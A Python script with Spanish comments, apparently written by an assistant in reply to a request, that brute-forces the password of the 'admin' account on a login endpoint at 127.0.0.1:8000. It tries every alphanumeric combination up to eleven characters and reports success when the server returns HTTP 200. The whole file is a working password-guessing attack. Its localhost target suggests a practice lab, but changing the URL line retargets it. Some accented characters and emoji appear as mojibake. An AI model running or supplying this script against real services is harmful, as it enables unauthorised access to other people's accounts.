import requests
import json
import itertools
import time
import sys
# NO se importan las excepciones (ConnectionError, Timeout)

# NO se usan los imports de concurrencia para mantener la simplicidad extrema, 
# ya que su uso sin 'with' ni 'try/finally' es muy propenso a errores. 
# Usaremos la versi√≥n secuencial para evitar fallos catastr√≥ficos.
# Si deseas la versi√≥n CONCURRENTE sin try, av√≠same. (Es mucho m√°s compleja de cerrar manualmente).
# Usaremos la versi√≥n secuencial simple aqu√≠:

# --- Configuraci√≥n del Ataque ---
URL = "http://127.0.0.1:8000/login"
USERNAME = "admin" 
ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
MAX_LENGTH = 11
SLEEP_TIME = 0.005 # Retraso m√≠nimo para no saturar inmediatamente el bucle

print(f"--- Iniciando Ataque de FUERZA BRUTA INESTABLE (Secuencial) contra {URL} ---")
print(f"Usuario objetivo: {USERNAME}")
print(f"Longitud m√°xima a probar: {MAX_LENGTH}")
print("-" * 50)

def run_simple_brute_force_attack():
    session = requests.Session() # Apertura manual de la sesi√≥n
    
    start_time = time.time()
    intentos = 0
    encontrado = False
    password = "" # Inicializar la contrase√±a

    try: # Usamos un try/except general solo para la terminaci√≥n del script
        for length in range(1, MAX_LENGTH + 1):
            print(f"\n--- Probando contrase√±as de longitud {length} ---")
            
            # Genera todas las combinaciones posibles
            to_attempt = itertools.product(ALPHABET, repeat=length)
            
            for attempt_tuple in to_attempt:
                password = "".join(attempt_tuple)
                intentos += 1
                
                # Solo imprime cada 10,000 intentos
                if intentos % 10000 == 0 or intentos <= 10:
                    print(f"Intento {intentos:,}: {password}")

                payload = {
                    "username": USERNAME,
                    "password": password
                }
                headers = {
                    "Content-Type": "application/json"
                }
                
                # üö´ SIN MANEJO DE EXCEPCIONES: Una falla de red aqu√≠ detendr√° el script.
                time.sleep(SLEEP_TIME) 
                response = session.post(URL, headers=headers, data=json.dumps(payload), timeout=5)

                # Verificar el c√≥digo de estado HTTP
                if response.status_code == 200:
                    encontrado = True
                    break # √âxito
                
                # Reportar c√≥digos inesperados que no sean 401
                elif response.status_code != 401:
                    print(f"‚ö†Ô∏è Error inesperado del servidor ({response.status_code}) para la contrase√±a: {password}. ¬øHay un error 500?")
                    # NOTA: En un script sin try, podr√≠as optar por salir aqu√≠ si el error es grave.
            
            if encontrado:
                break # √âxito
                
    except Exception as e:
        # Captura cualquier excepci√≥n, incluso las de conexi√≥n o las de tiempo de espera
        print(f"\nüö® ERROR CR√çTICO NO MANEJADO: El script se detuvo. Causa: {e}")
        
    finally:
        # Cierre manual y obligatorio de la sesi√≥n
        session.close()
        
    tiempo_total = time.time() - start_time
    print("-" * 50)
    
    if encontrado:
        print(f"‚úÖ √âXITO! Contrase√±a encontrada: {password}")
    else:
        print("‚ùå FALLO! La contrase√±a no se encontr√≥ dentro del l√≠mite de longitud o caracteres.")
        
    print(f"Intentos totales: {intentos:,}")
    print(f"Tiempo total: {tiempo_total:.4f} segundos")

if __name__ == "__main__":
    run_simple_brute_force_attack()